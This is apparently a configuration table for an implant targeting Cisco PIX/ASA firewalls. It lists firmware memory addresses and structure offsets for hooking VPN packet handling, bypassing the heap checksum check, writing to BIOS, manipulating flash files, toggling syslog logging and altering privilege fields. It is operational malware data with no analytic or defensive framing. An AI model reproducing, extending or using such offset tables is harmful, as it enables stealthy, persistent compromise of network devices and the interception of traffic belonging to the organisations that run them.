; --- SECTION I ---
;
0x10072200            // pix version
0x7e9000              // address of implant configuration
0x0   0x00ab9b18      // allocb
0x1   0x00ab84c8      // freeb
0x2   0x00116300      // open (7.0(+) this is an array for Channel Stuff)
0x3   0x0059d938      // ip_put
0x4   0x00116430      // close
0x5   0x01059c10      // atoip
0x6   0x010447d0      // memset
0x7   0x01063430      // memmove
0x8   0x00ab8288      // malloc_call_calloc
0x9   0x0104e620      // free
0xa   0x01049410      // printf
0xb   0x00000014      // interface offset in metaframe
0xc   0x00000010      // offset for vlan number in interface struct
0xd   0x0000005c      // metaframe offset in block structure
0xe   0x00000078      // interface semiphore in metaframe
0xf   0x01051c90      // rand
0x15  0x00114190      // process_create
0x16  0x00114a00      // process_suspend
0x17  0x00113bc0      // process_sleep_for
0x18  0x00898080      // show_process
0x19  0x0000001c      // offset to security level in int_struct
0x1a  0x013a8e80      // cur_t
0x1b  0x04      // channel offset in interface struct
0x1c  0x0c      // PUT offset in channel struct
0x1d  0x24      // offset to dest mac in arp structure
0x1e  0x00      // offset to next hop ip in route structure
0x1f  0x10      // size of route struct
0x20  0x0059f248      // calc_ip_cksum
0x21  0x005a1318      // arp_loopkup
0x22  0x0059f1e8      // set_block_hdr_mac_and_proto
0x23  0x005b2348      // get hardware interface
0x24  0x00ea09e8      // get next hop
0x25  0x00ea7548      // get route
0x26  0x0059afb8      // send_it
0x27  0x005a3338      // arp_create
0x28  0x008ebdf0      // get_hw_iface_2
0x2a  0x3c      // pointer to ethernet frame
0x2b  0x34            // wptr structure offset
0x2c  0x1c            // inIfc (incoming interface) structure offset
0x2d  0x0074e086      // VPN hook address
0x2e  0x190      // offset from cur_t that contains the current context number
0x2f  0x01328620      // pointer to channnel list
0x30  0x0119e860      // address of NIC database
0x31  0x00000014      // offset to vlan struct in metaframe (interface offset)
0x32  0x00000020      // offset to IP address in int_struct
0x33  0x00000018      // iface struct adjust from metaframe
0x34  0x0130ad90      // max number of interface cards
0x35  0x013a8620      // internal_clock
0x36  0x008ec750      // get_interface_mac
0x37  0x00000127      // offset to hardware interface number in interface struct
0x38  0x4c      // offset to ip in route structure
0x39  0x68      // offset to interface num in route structure
0x3a  0x420      // offset to send channel in channel list
0x3b  0x004d50e8      // ifs_read; flash file read routine -- IFS: Read:
0x3c  0x004d51c8      // ifs_write; flash file write routine -- IFS: Write:
0x3d  0x004d4a88      // ifs_open; flash file open routine -- IFS: Opened: 
0x3e  0x004d4f98      // ifs_close; flash file close routine -- IFS: Close: 
0x3f  0x00000018      // offset to next IP fragment pointer in block
0x40  0x013c1c50      // address of context list
0x41  0x005bbb08      // address of check for vpn packet function
0x42  0x012b7a84      // checkheaps checksum location
0x43  0x57            // VPN hook block register push opcode
;
; --- END OF SECTION I ---
;
:EOS:
;
; --- SECTION II ---
;
HookLocation        0x0074d8bf      // address of our hook point
JmpLocation         0x0078f9da      // address of our hook point
CheckHeapsLoc       0x012b7a84      // checkheaps checksum location
InterfaceAddr       0x0119e860      // same as 0x30 above
InterfaceLeng       0x0000019c      // length of interface struct
IntSecurityOffset   0x1c      // security level field offset
IntNameOffset       0x16c      // interface name field offset
IntNumOffset        0x127      // interface number field offset
IntVlanOffset       0x10      // same as 0xc above
IntIPOffset         0x20      // ip address offset in the interface struct
IntNetmaskOffset    0x24      // netmask in the iface struct
FlashClassAddr      0x00000000      // addr of flash structure (not used in 7.*)
CryptoDeviceAddr    0x013adc80      // addr of crypto structure
ArpTableAddrPtr     0x01190b68      // addr of first entry in ARP table
NumInterfaces       0x00000000      // addr of pointer to number of interfaces (not used in 7.*)
IfaceStruct2        0x00000000      // addr of pointer to second smaller interface struct (not used in 7.*)
IfaceStruct2Len     0x00      // length of 2nd smaller interface struct used by arp cache (not used in 7.*)
BiosClassAddr       0x013b92b0      // addr of the bios class structure
BiosWriteAddr1      0x00422850      // addr of the bios write function for one specific bios
BiosWriteAddr2      0x00425720      // addr of the bios write function for one specific bios
BiosWriteAddr3      0x004250d0      // addr of the bios write function for one specific bios
BiosWriteAddr4      0x00425f20      // addr of the bios write function for one specific bios
BiosWriteOffset     0x00000020      // offset into the bios structure where write addr is located
FlashMkdirAddress   0x004d5b78      // ifs_mkdir; make flash directory routine -- IFS: Mkdir
ASAFlashRmdirAddress   0x011631e7   // ifs_rmdir; remove flash directory routine for the asa
PIXFlashRmdirAddress   0x0041afc0      // ifs_rmdir; remove flash directory routine for the pix
ASAFlashRmfileAddress  0x01162e5a      // ifs_rmfile; remove flash file routine for the asa
PIXFlashRmfileAddress  0x0041ae40      // ifs_rmfile; remove flash file routine for the pix
FlashDirlistAddress 0x004d53a8      // ifs_get_dir_entry; get the next file name from a directory listing
FlashGetSizeAddress 0x004d4968      // ifs_get_size; get the size of the provided open file
FlashChmodAddress   0x004d56d8      // ifs_chmod; change the permissions on a file
FlashMoveFileAddress 0x004d5808     // ifs_rename; move a file
FlashGetFileInfoAddress 0x004d5dd8  // ifs_get_file_info; returns a structure that contains information about a file, including its size
FlashGetSpaceAddress 0x004d6dd8     // ifs_get_space_info; returns used and free space in flash
FlashFileInfoSizeOffset 0x00000014  // The offset to the file size in the structure returned by ifs_get_file_info
GetPlatformStringAddr 0x01049fd0  // The address of a function that returns the platform string 
ASARestatFlashFlagAddr 0x013dcb20 // The address of the flag that tells the OS on the ASA to re-stat the files in flash (causes used space to be updated)
AnnounceFunc              0x001161f0      // addr of the device announce function
DevIoctlOffset            0x70            // offset to ioctl function in device table
DuartTtyAddr              0x010f4510      // addr of duart/0 tty entry
CIStartFunc               0x0015d680      // addr of the command interface start function -- telnet function
CommandListAddr           0x011be1f0      // addr of the command list -- first parameter of ci
DeviceListPtrAddr         0x012cf9b0      // pointer to the first entry in the device table -- find in announce
DeviceNextPtrOffset       0x50            // offset into the device table entry which has pointer to next entry -- find in announce
StrcmpFuncAddr            0x01055fc0      // address of strcmp -- search for 'strcmp'
SyslogFlagPtrAddr         0x014739f8      // pointer to the logging flag. -- search for 'Syslog logging:'
PGDGETValue               0x85b00002      // The value used for PGD_GET when calling the pager ioctl
PGDPUSHValue              0x85b00003      // The value used for PGD_PUSH when calling the pager ioctl
PGDSETValue               0x85b00000      // The value used for PGD_SET when calling the pager ioctl
StdChOffset               0xb0            // Offset into a thread struct containing the stdch pointer
StdErrOffset              0xb4            // Offset into a thread struct containing the stderr pointer
PrivFlagOffset            0x0c            // offset into an environment struct containing the privilege level indicator
UnameOffset               0x14            // offset into an environment struct containing the username 
EnvPtrOffset              0xbc            // offset into a thread struct containing the pointer to the environment struct  
SyslogOffset              0x00000a38      // offset into the syslog structure where the logging level is stored
Open                      0x00116300      // open
ChannelConfigOffset       0x08            // offset into a channel where the configuration pointer is
InputModeOffset           0x08            // offset into a duart config structure where the input mode is stored
InputModeEsc              0x20            // Input mode used for entering escape sequence
WatchDogTimeout     0x010ccf10      // Address where the thread timeout value is stored 
UpTimeCounter       0x013a8620      // Address of the up time counter
i2cReadByte         0x0105aba0      // read byte function needed to operate on the bios of the asa 5505
i2cWriteByte        0x0105a9f0      // write byte function needed to operate on the bios of the asa 5505
;
; --- END OF SECTION II ---
;
:EOS:
;
